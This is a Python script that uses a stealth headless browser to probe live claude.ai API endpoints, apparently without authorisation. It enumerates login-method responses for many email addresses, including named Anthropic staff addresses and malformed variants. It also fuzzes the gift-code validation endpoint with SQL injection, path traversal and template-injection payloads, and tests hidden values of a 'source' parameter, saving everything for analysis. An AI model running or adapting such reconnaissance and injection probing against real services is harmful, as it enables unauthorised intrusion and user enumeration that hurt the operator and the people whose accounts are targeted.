#!/usr/bin/env python3
"""Capture exact login_methods responses per email domain."""
import asyncio, json, os
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/anthropic-tamper"
os.makedirs(OUTPUT_DIR, exist_ok=True)

async def test_fetch(page, url, method="GET", body=None):
    try:
        body_json = json.dumps(body) if body else "null"
        has_body = body is not None
        if has_body:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({body_json})
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        else:
            r = await page.evaluate(f"""async () => {{
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}',
                        credentials: 'include'
                    }});
                    const text = await resp.text();
                    return {{status: resp.status, body: text}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        return r
    except:
        return {"status": 0, "body": ""}

async def main():
    from cloakbrowser import launch_async
    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    print("🌐 Loading claude.ai...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    # Test login_methods with many different emails
    print("\n🔍 LOGIN_METHODS — Response Diff Analysis")
    print("="*70)

    emails = [
        # Generic
        "test@test.com", "user@test.com", "admin@test.com",
        # Real-looking
        "test@gmail.com", "user@yahoo.com", "admin@hotmail.com",
        # Anthropic internal
        "admin@anthropic.com", "support@anthropic.com", "info@anthropic.com",
        "security@anthropic.com", "billing@anthropic.com", "team@anthropic.com",
        "dario@anthropic.com", "dan@anthropic.com", "chris@anthropic.com",
        # Plus addressing
        "test+admin@test.com", "test+user@test.com", "test+123@test.com",
        # Null bytes
        "test%00admin@test.com", "test@test.com%00",
        # Whitespace
        "test@test.com ", " test@test.com", "test@test.com\n", "test@test.com\t",
        # Case
        "TEST@TEST.COM", "test@TEST.COM", "test@test.COM",
        # Unicode
        "test@xn--nxasmq6b.com", "test@日本語.com",
        # Long
        "a" * 100 + "@test.com",
        # Special
        "test@localhost", "test@127.0.0.1", "test@0.0.0.0",
        # Pattern
        "test@test.co.uk", "test@test.org", "test@test.io",
    ]

    responses = {}
    for email in emails:
        url = f"https://claude.ai/api/auth/login_methods?email={email}&source=claude-ai"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        responses[email] = {"status": status, "body": body}
        await asyncio.sleep(0.15)

    # Group by unique responses
    body_groups = {}
    for email, data in responses.items():
        body = data["body"]
        if body not in body_groups:
            body_groups[body] = []
        body_groups[body].append(email)

    print(f"\n📊 {len(body_groups)} unique response groups:")
    for i, (body, emails_list) in enumerate(body_groups.items()):
        print(f"\n--- Group {i+1} ({len(emails_list)} emails) ---")
        print(f"Response: {body[:300]}")
        print(f"Emails: {emails_list[:5]}...")

    # Now test gift_validate with more patterns
    print("\n\n🔍 GIFT_VALIDATE — Response Diff Analysis")
    print("="*70)

    codes = [
        "TEST", "AAAA", "0000", "1234", "ADMIN", "FREE", "UNLIMITED",
        "AAAA-BBBB-CCCC-DDDD", "TEST-CODE-1234-5678",
        "test", "Test", "TEST",
        "TEST%00", "TEST%0a", "TEST%0d%0a",
        "TEST' OR '1'='1", "TEST\" OR \"1\"=\"1",
        "../../../etc/passwd", "${7*7}", "{{7*7}}",
        "A" * 100, "A" * 1000,
        "null", "undefined", "NaN", "true", "false",
        "0", "-1", "999999999",
        "!@#$%^&*()",
    ]

    gift_responses = {}
    for code in codes:
        url = f"https://claude.ai/api/billing/gift/validate?code={code}"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        gift_responses[code] = {"status": status, "body": body}
        await asyncio.sleep(0.15)

    gift_body_groups = {}
    for code, data in gift_responses.items():
        body = data["body"]
        if body not in gift_body_groups:
            gift_body_groups[body] = []
        gift_body_groups[body].append(code)

    print(f"\n📊 {len(gift_body_groups)} unique response groups:")
    for i, (body, codes_list) in enumerate(gift_body_groups.items()):
        print(f"\n--- Group {i+1} ({len(codes_list)} codes) ---")
        print(f"Response: {body[:300]}")
        print(f"Codes: {codes_list[:10]}...")

    # Save detailed results
    all_results = {
        "login_methods": responses,
        "login_methods_groups": body_groups,
        "gift_validate": gift_responses,
        "gift_validate_groups": gift_body_groups,
    }
    with open(f"{OUTPUT_DIR}/detailed-responses.json", "w") as fp:
        json.dump(all_results, fp, indent=2)

    # Also test: can we get a DIFFERENT response from login_methods with different source values?
    print("\n\n🔍 LOGIN_METHODS — Source Parameter Analysis")
    print("="*70)

    sources = ["claude", "claude-ai", "console", "admin", "test", "mobile", "api", ""]
    source_responses = {}
    for source in sources:
        url = f"https://claude.ai/api/auth/login_methods?email=test@gmail.com&source={source}"
        r = await test_fetch(page, url)
        status = r.get("status", 0)
        body = r.get("body", "")
        source_responses[source] = {"status": status, "body": body}
        print(f"   source={source:15s} → {status} | {body[:100]}")
        await asyncio.sleep(0.15)

    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
